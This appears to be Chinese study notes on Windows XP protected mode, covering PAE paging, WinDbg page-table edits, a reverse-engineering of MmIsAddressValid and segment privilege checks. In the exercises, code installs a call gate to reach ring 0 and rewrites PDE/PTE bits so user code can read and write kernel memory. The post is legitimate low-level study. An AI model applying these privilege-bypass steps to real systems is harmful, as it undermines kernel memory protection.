<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">  DWORD dwNumber = <span class="number">0x12345678</span>;</span><br><span class="line">  PDWORD p = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;变量dwNumber的线性地址为：0x%P，请在windbg中给NULL挂物理页：\n&quot;</span>,&amp;dwNumber);</span><br><span class="line">  getchar();<span class="comment">//修改NULL的PTE，给NULL挂物理页</span></span><br><span class="line">  </span><br><span class="line">  DWORD dwNull = *p;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;线性地址NULL中的值为：%x\n&quot;</span>,dwNull);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>运行程序获取变量dwNumber的线性地址：0x0012FF7C。</p>
</li>
<li><p>获取CR3的值<code>!process 0 0</code>：0x06e401c0。</p>
</li>
<li><p>按2-9-9-12拆分线性地址NULL(0)、0x0012FF7C。</p>
<ol>
<li><p>NULL：<code>!vtop 0x06e401c0 0x0</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">X86VtoP: Virt <span class="number">00000000</span>, pagedir <span class="number">6e401</span>c0</span><br><span class="line">X86VtoP: PAE PDPE <span class="number">6e401</span>c0 - <span class="number">00000000</span>`<span class="number">223</span>d9801</span><br><span class="line">X86VtoP: PAE PDE <span class="number">223</span>d9000 - <span class="number">00000000</span>`<span class="number">224</span>c7867</span><br><span class="line">X86VtoP: PAE PTE <span class="number">224</span>c7000 - <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">X86VtoP: PAE zero PTE</span><br></pre></td></tr></table></figure>
</li>
<li><p>0x0012FF7C：<code>!vtop 0x06e401c0 0x0012FF7C</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">X86VtoP: Virt <span class="number">0012f</span>f7c, pagedir <span class="number">6e401</span>c0</span><br><span class="line">X86VtoP: PAE PDPE <span class="number">6e401</span>c0 - <span class="number">00000000</span>`<span class="number">223</span>d9801</span><br><span class="line">X86VtoP: PAE PDE <span class="number">223</span>d9000 - <span class="number">00000000</span>`<span class="number">224</span>c7867</span><br><span class="line">X86VtoP: PAE PTE <span class="number">224</span>c7978 - <span class="number">80000000</span>`<span class="number">2235</span>c867</span><br><span class="line">X86VtoP: PAE Mapped phys <span class="number">2235</span>cf7c</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>可以看到NULL的PDE不为空，则直接修改PTE即可：由于<code>!eq</code>指令没法使用，则<code>!ed 0x224c7000 0x2235c867 </code>，<code>!ed 0x224c7004 0x80000000</code>。</p>
</li>
<li><p>此时再查看：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !vtop <span class="number">0x06e401c0</span> <span class="number">0x0</span></span><br><span class="line">X86VtoP: Virt <span class="number">00000000</span>, pagedir <span class="number">6e401</span>c0</span><br><span class="line">X86VtoP: PAE PDPE <span class="number">6e401</span>c0 - <span class="number">00000000223</span>d9801</span><br><span class="line">X86VtoP: PAE PDE <span class="number">223</span>d9000 - <span class="number">00000000224</span>c7867</span><br><span class="line">X86VtoP: PAE PTE <span class="number">224</span>c7000 - <span class="number">800000002235</span>c867</span><br><span class="line">X86VtoP: PAE Mapped phys <span class="number">2235</span>c000</span><br></pre></td></tr></table></figure>
</li>
<li><p>回到XP的VC6中继续执行代码。</p>
<p><img data-src="https://s2.loli.net/2022/01/05/RXY31Qhey5wpfm8.png" alt="34.png"><img data-src="https://s2.loli.net/2022/01/05/NWO9DwXk7Jb8AuH.png" alt="35.png"></p>
</li>
</ol>
<h3 id="1-a-练习：修改页属性读写高2G地址"><a href="#1-a-练习：修改页属性读写高2G地址" class="headerlink" title="1.a 练习：修改页属性读写高2G地址"></a>1.a 练习：修改页属性读写高2G地址</h3><p>除了<mark class="label success">G</mark>位和<mark class="label warning">XD</mark>位属性为<mark class="label danger">OR</mark>外，其余属性为： <strong>PDPTE属性 &amp; PDE属性 &amp; PTE属性</strong>。</p>
<p>要想在3环读写高2G地址，除了段中学到的提权外，还可以使用页的手段：改<strong>U&#x2F;S位，和PTE的G位</strong>。</p>
<div class="note primary"><p>G位和TLB及PS位有关（PDE、PTE均包含G、PS位）：</p>
<ol>
<li>PDE的PS &#x3D; 0（小页4KB），G位在PDE中无效。</li>
<li>由于G位的属性是：<mark class="label success">PDE_G | PTE_G</mark>，当PTE的G &#x3D; 1时，表示该物理页有缓存（使用了快表TLB），故要想使U&#x2F;S修改后生效，<strong>要保证PTE中的G &#x3D; 0</strong>。</li>
</ol>
</div>

<p>题目：在3环写代码读写线性地址：0x8003f048。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;请在windbg中修改线性地址0x8003f048 PDE、PTE的U/S位及PTE的G位：\n&quot;</span>);</span><br><span class="line">  getchar();<span class="comment">//修改NULL的PTE，给NULL挂物理页</span></span><br><span class="line">  </span><br><span class="line">  PDWORD p = (PDWORD)<span class="number">0x8003f048</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;线性地址0x8003f048中的值为：%x\n&quot;</span>,*p);<span class="comment">//读</span></span><br><span class="line">  *p = <span class="number">0x12345678</span>;<span class="comment">//写</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;线性地址0x8003f048中的值为：%x\n&quot;</span>,*p);<span class="comment">//读      </span></span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>运行程序，并使用<code>!process 0 0</code>获取CR3的值：0x06e401c0。</p>
</li>
<li><p>拆分线性地址0x8003f048：<code>!vtop 0x06e401c0 0x8003f048</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">X86VtoP: Virt <span class="number">8003f</span>048, pagedir <span class="number">6e401</span>c0</span><br><span class="line">X86VtoP: PAE PDPE <span class="number">6e401</span>d0 - <span class="number">00000000</span>`<span class="number">2556f</span>801</span><br><span class="line">X86VtoP: PAE PDE <span class="number">2556f</span>000 - <span class="number">00000000</span>`<span class="number">00b</span>17163</span><br><span class="line">X86VtoP: PAE PTE b171f8 - <span class="number">00000000</span>`<span class="number">0003f</span>163</span><br><span class="line">X86VtoP: PAE Mapped phys <span class="number">3f</span>048</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以看到PDE、PTE下标2(低3位)的U&#x2F;S为0（特权用户），需要修改为1。PTE下标8(低9位)G位为1，需要修改为0。</p>
<ul>
<li>修改PDE：<code>!ed 0x2556f000 0x00b17167</code>。</li>
<li>修改PTE：<code>!ed 0x00b171f8 0x0003f067</code>。</li>
</ul>
</li>
<li><p>回到XP的VC6继续执行代码。</p>
<p><img data-src="https://s2.loli.net/2022/01/05/HXQYzlycweShIKE.png" alt="36.png"></p>
</li>
</ol>
<h3 id="1-b-逆向分析函数MmIsAddressValid"><a href="#1-b-逆向分析函数MmIsAddressValid" class="headerlink" title="1.b 逆向分析函数MmIsAddressValid"></a>1.b 逆向分析函数MmIsAddressValid</h3><p>内核函数<code>MmIsAddressValid</code>的作用：验证一个线性地址是否有效。</p>
<p>在MSDN是这样说的：The <strong>MmIsAddressValid</strong> routine checks whether a page fault will occur for a read or write operation at a given virtual address.（<strong>MmIsAddressValid</strong>例程检查给定虚拟地址的读写操作是否会发生页面错误。）</p>
<p>找函数方法：</p>
<p>方法一：在windbg中输入 <code>u MmIsAddressValid L41</code>或<code>uf MmIsAddressValid</code>。</p>
<p><strong>方法二：</strong>在C:\Windows\System32\ 中找到内核程序，用IDA分析。</p>
<ul>
<li>2-9-9-12分页内核：ntkrnlpa.exe</li>
<li>10-10-12分页内核：ntoskrnl.exe</li>
</ul>
<p>函数分析：</p>
<ol>
<li><code>mov edi,edi</code> ：正式分析前，先聊聊函数头的 <code>mov edi,edi</code> 指令。这条指令看起来什么也没做，但是很多系统函数开头都有这条指令，why？其实这是为了实现对函数行为的动态修改（热补丁，Hot-Patching），且执行一条MOV指令比执行两条NOP指令花费更少的时间。可以一下这篇文章 <a href="https://blog.csdn.net/swanabin/article/details/17550897">函数开始处的MOV EDI, EDI的作用</a>。</li>
<li><code>align 8</code>：数据8字节对齐。</li>
<li><code>bp-based frame</code>：使用 EBP 寻址。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0043</span>C921 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0043</span>C922                 align <span class="number">8</span>			<span class="comment">//数据8字节对齐</span></span><br><span class="line">.text:<span class="number">0043</span>C928 ; Exported entry <span class="number">685.</span> MmIsAddressValid</span><br><span class="line">.text:<span class="number">0043</span>C928</span><br><span class="line">.text:<span class="number">0043</span>C928 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">0043</span>C928</span><br><span class="line">.text:<span class="number">0043</span>C928 ; Attributes: bp-based frame		<span class="comment">//使用 EBP 寻址</span></span><br><span class="line">.text:<span class="number">0043</span>C928</span><br><span class="line">.text:<span class="number">0043</span>C928 ; <span class="function">BOOLEAN __stdcall <span class="title">MmIsAddressValid</span><span class="params">(PVOID VirtualAddress)</span></span></span><br><span class="line"><span class="function">.text:0043C928                 <span class="keyword">public</span> MmIsAddressValid</span></span><br><span class="line"><span class="function">.text:0043C928 MmIsAddressValid proc near              </span>; CODE XREF: sub_41AD5A+<span class="number">2F</span>↑p</span><br><span class="line">.text:<span class="number">0043</span>C928                                         ; sub_41ADAC+<span class="number">29</span>↑p ...</span><br><span class="line">.text:<span class="number">0043</span>C928</span><br><span class="line">.text:<span class="number">0043</span>C928 var_8           = dword ptr <span class="number">-8</span>		<span class="comment">//局部变量2</span></span><br><span class="line">.text:<span class="number">0043</span>C928 var_4           = dword ptr <span class="number">-4</span>		<span class="comment">//局部变量1</span></span><br><span class="line">.text:<span class="number">0043</span>C928 VirtualAddress  = dword ptr  <span class="number">8</span>		<span class="comment">//参数1，EBP+8</span></span><br><span class="line">.text:<span class="number">0043</span>C928</span><br><span class="line">.text:<span class="number">0043</span>C928                 mov     edi, edi		<span class="comment">//Hot-Patching</span></span><br><span class="line">.text:<span class="number">0043</span>C92A                 push    ebp</span><br><span class="line">.text:<span class="number">0043</span>C92B                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0043</span>C92D                 push    ecx		<span class="comment">//保存 ECX 的值，同时为局部变量1留坑位</span></span><br><span class="line">.text:<span class="number">0043</span>C92E                 push    ecx		<span class="comment">//保存 ECX 的值，同时为局部变量2留坑位</span></span><br><span class="line">.text:<span class="number">0043</span>C92F                 mov     ecx, [ebp+VirtualAddress]<span class="comment">//取参数VirtualAddress，线性地址，ecx = VAddr</span></span><br><span class="line">.text:<span class="number">0043</span>C932                 push    esi</span><br><span class="line">.text:<span class="number">0043</span>C933                 mov     eax, ecx		<span class="comment">//eax = VAddr</span></span><br><span class="line">.text:<span class="number">0043</span>C935                 shr     eax, <span class="number">12</span>h		<span class="comment">//VAddr&gt;&gt;18</span></span><br><span class="line">.text:<span class="number">0043</span>C938                 mov     esi, <span class="number">3F</span>F8h	<span class="comment">//0011 1111 1111 1000，2--0011左移12位，9--111111111左移3位</span></span><br><span class="line">.text:<span class="number">0043</span>C93D                 <span class="keyword">and</span>     eax, esi		<span class="comment">//eax = PDPTI * 4KB + PDI * 8</span></span><br><span class="line">.text:<span class="number">0043</span>C93F                 sub     eax, <span class="number">3F</span>A00000h	<span class="comment">//eax = C0600000 + PDPTI * 4KB + PDI * 8</span></span><br><span class="line">.text:<span class="number">0043</span>C93F						<span class="comment">//eax指向PDE</span></span><br><span class="line">.text:<span class="number">0043</span>C944                 mov     edx, [eax]	<span class="comment">//edx = PDE低4字节</span></span><br><span class="line">.text:<span class="number">0043</span>C946                 mov     eax, [eax+<span class="number">4</span>]	<span class="comment">//eax = PDE高4字节</span></span><br><span class="line">.text:<span class="number">0043</span>C949                 mov     [ebp+var_4], eax	<span class="comment">//局部变量1为PDE高4字节</span></span><br><span class="line">.text:<span class="number">0043</span>C94C                 mov     eax, edx		<span class="comment">//eax = edx = PDE低4字节</span></span><br><span class="line">.text:<span class="number">0043</span>C94E                 push    edi</span><br><span class="line">.text:<span class="number">0043</span>C94F                 <span class="keyword">and</span>     eax, <span class="number">1</span>		<span class="comment">//取PDE的P位</span></span><br><span class="line">.text:<span class="number">0043</span>C952                 <span class="keyword">xor</span>     edi, edi</span><br><span class="line">.text:<span class="number">0043</span>C954                 <span class="keyword">or</span>      eax, edi		<span class="comment">//判断P = 0？</span></span><br><span class="line">.text:<span class="number">0043</span>C956                 jz      <span class="keyword">short</span> loc_43C9B9	<span class="comment">//if (P==0) 返回假，返回0</span></span><br><span class="line">.text:<span class="number">0043</span>C958                 mov     edi, <span class="number">80</span>h		</span><br><span class="line">.text:<span class="number">0043</span>C95D                 <span class="keyword">and</span>     edx, edi		<span class="comment">//取PS位[7]，判断大小页</span></span><br><span class="line">.text:<span class="number">0043</span>C95F                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">0043</span>C961                 mov     [ebp+var_8], edx</span><br><span class="line">.text:<span class="number">0043</span>C964                 pop     eax		<span class="comment">//eax = 0</span></span><br><span class="line">.text:<span class="number">0043</span>C965                 jz      <span class="keyword">short</span> loc_43C96B	<span class="comment">//and edx,edi与运算后如果结果为0，PS = 0，转到小页处理</span></span><br><span class="line">.text:<span class="number">0043</span>C967                 test    eax, eax</span><br><span class="line">.text:<span class="number">0043</span>C969                 jz      <span class="keyword">short</span> loc_43C9BD	<span class="comment">//判定线性地址在大页，为有效地址，直接返回真，返回1</span></span><br><span class="line">.text:<span class="number">0043</span>C96B</span><br><span class="line">.text:<span class="number">0043</span>C96B loc_43C96B:                             ; CODE XREF: MmIsAddressValid+<span class="number">3</span>D↑j</span><br><span class="line">.text:<span class="number">0043</span>C96B                 shr     ecx, <span class="number">9</span>		<span class="comment">//ecx = VAddr，VAddr&gt;&gt;9</span></span><br><span class="line">							<span class="comment">//0111 1111 1111 1111 1111 1000--011`1 1111 1111`1111 1111 1`000</span></span><br><span class="line">.text:<span class="number">0043</span>C96E                 <span class="keyword">and</span>     ecx, <span class="number">7F</span>FFF8h	<span class="comment">//ecx = PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">.text:<span class="number">0043</span>C974                 mov     eax, [ecx<span class="number">-3F</span>FFFFFCh]<span class="comment">//eax = PTE高4字节，C0000004</span></span><br><span class="line">.text:<span class="number">0043</span>C97A                 sub     ecx, <span class="number">40000000</span>h	<span class="comment">//ecx = C0000000 + PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">  							<span class="comment">//ecx指向PTE</span></span><br><span class="line">.text:<span class="number">0043</span>C980                 mov     edx, [ecx]	<span class="comment">//edx = PTE低4字节</span></span><br><span class="line">.text:<span class="number">0043</span>C982                 mov     [ebp+var_4], eax</span><br><span class="line">.text:<span class="number">0043</span>C985                 push    ebx</span><br><span class="line">.text:<span class="number">0043</span>C986                 mov     eax, edx		<span class="comment">//eax = edx = PTE低4字节</span></span><br><span class="line">.text:<span class="number">0043</span>C988                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0043</span>C98A                 <span class="keyword">and</span>     eax, <span class="number">1</span>		<span class="comment">//取PTE的P位</span></span><br><span class="line">.text:<span class="number">0043</span>C98D                 <span class="keyword">or</span>      eax, ebx		<span class="comment">//判断P = 0？</span></span><br><span class="line">.text:<span class="number">0043</span>C98F                 pop     ebx</span><br><span class="line">.text:<span class="number">0043</span>C990                 jz      <span class="keyword">short</span> loc_43C9B9	<span class="comment">//if( p==0)，返回假，返回0</span></span><br><span class="line">.text:<span class="number">0043</span>C992                 <span class="keyword">and</span>     edx, edi		<span class="comment">//判断PTE的PAT = 0？</span></span><br><span class="line">.text:<span class="number">0043</span>C994                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">0043</span>C996                 mov     [ebp+var_8], edx</span><br><span class="line">.text:<span class="number">0043</span>C999                 pop     eax</span><br><span class="line">.text:<span class="number">0043</span>C99A                 jz      <span class="keyword">short</span> loc_43C9BD	<span class="comment">//PTE的PAT = 0，返回真，返回1，即有效地址</span></span><br><span class="line">.text:<span class="number">0043</span>C99C                 test    eax, eax</span><br><span class="line">.text:<span class="number">0043</span>C99E                 jnz     <span class="keyword">short</span> loc_43C9BD	<span class="comment">//PAT = 1，以后再分析PAT的意义</span></span><br><span class="line">.text:<span class="number">0043</span>C9A0                 <span class="keyword">and</span>     ecx, esi</span><br><span class="line">.text:<span class="number">0043</span>C9A2                 mov     ecx, [ecx<span class="number">-3F</span>A00000h]</span><br><span class="line">.text:<span class="number">0043</span>C9A8                 mov     eax, <span class="number">81</span>h</span><br><span class="line">.text:<span class="number">0043</span>C9AD                 <span class="keyword">and</span>     ecx, eax</span><br><span class="line">.text:<span class="number">0043</span>C9AF                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">.text:<span class="number">0043</span>C9B1                 cmp     ecx, eax</span><br><span class="line">.text:<span class="number">0043</span>C9B3                 jnz     <span class="keyword">short</span> loc_43C9BD</span><br><span class="line">.text:<span class="number">0043</span>C9B5                 test    edx, edx</span><br><span class="line">.text:<span class="number">0043</span>C9B7                 jnz     <span class="keyword">short</span> loc_43C9BD</span><br><span class="line">.text:<span class="number">0043</span>C9B9</span><br><span class="line">.text:<span class="number">0043</span>C9B9 loc_43C9B9:                             ; CODE XREF: MmIsAddressValid+<span class="number">2</span>E↑j</span><br><span class="line">.text:<span class="number">0043</span>C9B9                                         ; MmIsAddressValid+<span class="number">68</span>↑j</span><br><span class="line">.text:<span class="number">0043</span>C9B9                 <span class="keyword">xor</span>     al, al		<span class="comment">//eax为返回值</span></span><br><span class="line">.text:<span class="number">0043</span>C9BB                 jmp     <span class="keyword">short</span> loc_43C9BF</span><br><span class="line">.text:<span class="number">0043</span>C9BD ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0043</span>C9BD</span><br><span class="line">.text:<span class="number">0043</span>C9BD loc_43C9BD:                             ; CODE XREF: MmIsAddressValid+<span class="number">41</span>↑j</span><br><span class="line">.text:<span class="number">0043</span>C9BD                                         ; MmIsAddressValid+<span class="number">72</span>↑j ...</span><br><span class="line">.text:<span class="number">0043</span>C9BD                 mov     al, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0043</span>C9BF</span><br><span class="line">.text:<span class="number">0043</span>C9BF loc_43C9BF:                             ; CODE XREF: MmIsAddressValid+<span class="number">93</span>↑j</span><br><span class="line">.text:<span class="number">0043</span>C9BF                 pop     edi</span><br><span class="line">.text:<span class="number">0043</span>C9C0                 pop     esi</span><br><span class="line">.text:<span class="number">0043</span>C9C1                 leave</span><br><span class="line">.text:<span class="number">0043</span>C9C2                 retn    <span class="number">4</span></span><br><span class="line">.text:<span class="number">0043</span>C9C2 MmIsAddressValid endp</span><br><span class="line">.text:<span class="number">0043</span>C9C2</span><br><span class="line">.text:<span class="number">0043</span>C9C2 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>分析结果：</p>
<div class="note danger"><p>2-9-9-12：<br>PDPTI-PDI-PTI-OFFSET                    </p>
<p>公式：<br><strong>PDE &#x3D; 0xc0600000 + (PDPTI*4KB) + (PDI*8)</strong><br><strong>PTE &#x3D; 0xc0000000 + (PDPTI*2MB) + (PDI*4KB) + (PTI*8)</strong>                    </p>
<p>更高效的公式（MmIsAddressValid是这么干的）<br>PDE &#x3D; 0xc0600000 + ((addr &gt;&gt; 18) &amp; 0x3ff8)<br>PTE &#x3D; 0xc0000000 + ((addr &gt;&gt; 9) &amp; 0x7ffff8)</p>
</div>



<h3 id="1-c-练习：代码实现读写高2G地址"><a href="#1-c-练习：代码实现读写高2G地址" class="headerlink" title="1.c 练习：代码实现读写高2G地址"></a>1.c 练习：代码实现读写高2G地址</h3><p>题目：在3环写代码读写线性地址：0x8003f048。</p>
<p>方法：通过构造调用门在0环修改线性地址0x8003f048对应<strong>PDE_U&#x2F;S &#x3D; 1、PTE_U&#x2F;S &#x3D; 1</strong>和<strong>PTE_G &#x3D; 0</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">VOID __declspec(naked) CallGate_RW8003f048()</span><br><span class="line">&#123;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    pushad;</span><br><span class="line">    pushfd;</span><br><span class="line">    <span class="comment">//先找PDE</span></span><br><span class="line">    <span class="comment">//int 3;</span></span><br><span class="line">    mov eax,<span class="number">0x8003f048</span>;</span><br><span class="line">    push eax;</span><br><span class="line">    shr eax,<span class="number">18</span>;			<span class="comment">//eax = dwAddr&gt;&gt;18</span></span><br><span class="line">    <span class="keyword">and</span> eax,<span class="number">0x3ff8</span>;		<span class="comment">//eax = (dwAddr&gt;&gt;18) &amp; 0x3ff8 = PDPTI * 4KB + PDI * 8</span></span><br><span class="line">    add eax,<span class="number">0xc0600000</span>;		<span class="comment">//eax = C0600000 + PDPTI * 4KB + PDI * 8</span></span><br><span class="line">    				<span class="comment">//eax 指向PDE</span></span><br><span class="line">    mov esi,eax;</span><br><span class="line">    mov eax,[eax];		<span class="comment">//eax = PDE低4字节</span></span><br><span class="line">    mov ebx,eax;		<span class="comment">//ebx = eax = PDE低4字节</span></span><br><span class="line">    <span class="comment">//再找PTE</span></span><br><span class="line">    pop eax;</span><br><span class="line">    shr eax,<span class="number">9</span>;			<span class="comment">//eax =dwAddr&gt;&gt;9</span></span><br><span class="line">    <span class="keyword">and</span> eax,<span class="number">0x7ffff8</span>;		<span class="comment">//eax = (dwAddr &gt;&gt; 9) &amp; 0x7ffff8 = PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">    add eax,<span class="number">0xc0000000</span>;		<span class="comment">//eax = 0xc0000000 + PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">    				<span class="comment">//eax指向PTE</span></span><br><span class="line">    mov edi,eax;</span><br><span class="line">    mov eax,[eax];		<span class="comment">//eax = PTE低4字节</span></span><br><span class="line">    mov ecx,eax;		<span class="comment">//ecx = eax = PTE低4字节</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判断PDE的P位和PS位（省略），PTE P、PAT位（省略）</span></span><br><span class="line">    <span class="comment">//修改PDE、PTE的U/S[2] = 1，修改PTE的G[8] = 0。（如果PDE_PS = 0(小页)，PDE_G位无效）</span></span><br><span class="line">    <span class="keyword">or</span> ebx,<span class="number">0x4</span>;			<span class="comment">//PDE_U/S = 1</span></span><br><span class="line">    <span class="keyword">or</span> ecx,<span class="number">0x4</span>;			<span class="comment">//PTE_U/S = 1</span></span><br><span class="line">    <span class="keyword">and</span> ecx,<span class="number">0xFFFFFEFF</span>;		<span class="comment">//PTE_G = 0</span></span><br><span class="line">    mov [esi],ebx;		<span class="comment">//将修改后的PDE低4字节写回</span></span><br><span class="line">    mov [esi+<span class="number">4</span>],<span class="number">0x0</span>;		<span class="comment">//将修改后的PDE高4字节写回</span></span><br><span class="line">    INVLPG dword ptr ds:[<span class="number">0x8003f048</span>];	<span class="comment">//清空线性地址0x8003f048在TLB的缓存</span></span><br><span class="line">    mov [edi],ecx;		<span class="comment">//将修改后的PTE低4字节写回</span></span><br><span class="line">    mov [edi+<span class="number">4</span>],<span class="number">0x0</span>;		<span class="comment">//将修改后的PTE高4字节写回</span></span><br><span class="line"></span><br><span class="line">    popfd;</span><br><span class="line">    popad;</span><br><span class="line">    retf;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	PDWORD p = (PDWORD)<span class="number">0x8003f048</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)CallGate_RW8003f048&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)CallGate_RW8003f048 &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">	getchar();</span><br><span class="line">	__asm</span><br><span class="line">	  &#123;</span><br><span class="line">		call fword ptr ds:[CallGate];</span><br><span class="line">	  &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线性地址0x8003f048中的值为：%x\n&quot;</span>,*p);<span class="comment">//读</span></span><br><span class="line">	*p = <span class="number">0x12345678</span>;<span class="comment">//写</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线性地址0x8003f048中的值为：%x\n&quot;</span>,*p);<span class="comment">//读 </span></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img data-src="https://s2.loli.net/2022/01/06/7Abuelzoq13pj8K.png" alt="39.png"></p>
<p>注意：代码中如果不使用<code>INVLPG dword ptr ds:[0x8003f048];</code>清空线性地址0x8003f048在TLB缓存的话，<code>eq 8003f048 0040ec00·00081005</code>修改后到VC6中第一次运行时报错不能读写高2G内存（可不要退出程序再按F5继续执行即可成功），如果使用INVLPG清空0x8003f048在TLB缓存，则可直接运行成功。</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>保护模式</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 段保护（二）</title>
    <url>/post/WinXP-ProtectionMode-Segment2/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-段权限检查"><a href="#1-段权限检查" class="headerlink" title="1 段权限检查"></a>1 段权限检查</h2><ol>
<li><strong>根据段选择子找到段描述符之后，将段描述符加载到段寄存器之前会进行权限检查</strong>（是否将该段描述符加载到段寄存器中）。</li>
<li>Windows没有使用R1、R2</li>
<li>CS、SS段寄存器的低2位存储的就是CPL（RPL是段选择子的低2位，CPL特指CS、SS低2位），当前程序的特权级别。Windows中只能为0x00或0x11</li>
</ol>
<p>G位：决定limit的大小</p>
<ul>
<li>1：limit &#x3D; <strong>0xFFFFFFFF</strong></li>
<li>0：limit &#x3D;<strong>0xFFFFF</strong></li>
</ul>
<p>D&#x2F;B位：地址空间的大小</p>
<ul>
<li>1：4GB（<strong>FFFFFFFF</strong>）</li>
<li>0：64K（<strong>FFFF</strong>）</li>
</ul>
<div class="note danger"><p>RPL：段选择子的权限（我以什么样的特权去访问你）<br>DPL：段的权限（你要访问我，你应该具有什么特权）<br>CPL：CPU当前的权限级别（CPL特指CS、SS低2位）</p>
</div>

<p>数据段（DS）的权限检查和CS、SS段不同。</p>
<h3 id="1-1-段权限检查"><a href="#1-1-段权限检查" class="headerlink" title="1.1 段权限检查"></a>1.1 段权限检查</h3><p>段权限检查步骤：</p>
<p>1、段选择子拆分</p>
<p>2、查表得到段描述符</p>
<p>3、权限检查</p>
<p>4、加载段描述符到段寄存器</p>
<p>5、代码执行EIP</p>
<div class="note primary"><p><strong>数据段权限检查</strong>（满足条件，才能成功访问数据段。）：</p>
<p>CPL &lt;&#x3D; DPL 并且 RPL &lt;&#x3D; DPL (数值上的比较)</p>
<p><strong>代码段权限检查：</strong></p>
<ul>
<li>非一致代码段：CPL &#x3D; DPL 并且 RPL &lt;&#x3D; DPL</li>
<li>一致代码段：CPL &gt;&#x3D; DPL</li>
</ul>
</div>

<h3 id="1-2-练习"><a href="#1-2-练习" class="headerlink" title="1.2 练习"></a>1.2 练习</h3><p>&lt;1&gt; 在3环能加载的数据段有哪些？<br>3环CPL&#x3D;3，只能加载DPL&#x3D;3的数据段。</p>
<p>&lt;2&gt; 在0环能加载的数据段有哪些？<br>0环CPL&#x3D;0，满足RPL&lt;&#x3D;DPL的数据段都可以加载。</p>
